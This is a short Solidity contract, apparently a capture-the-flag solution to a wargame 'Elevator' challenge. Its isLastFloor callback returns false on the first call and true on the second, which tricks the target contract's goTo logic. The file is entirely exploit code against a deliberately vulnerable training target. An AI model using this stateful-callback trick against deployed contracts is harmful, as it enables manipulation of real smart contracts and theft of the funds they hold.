// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IElevator{
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {

    IElevator elevator;

    bool public isSecondTime;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint256) external returns(bool){
        if(isSecondTime){
            return true;
        }

        isSecondTime = true;

        return false;
    }

    function Attack(uint256 _floor) external {
        elevator.goTo(_floor);   
    }
}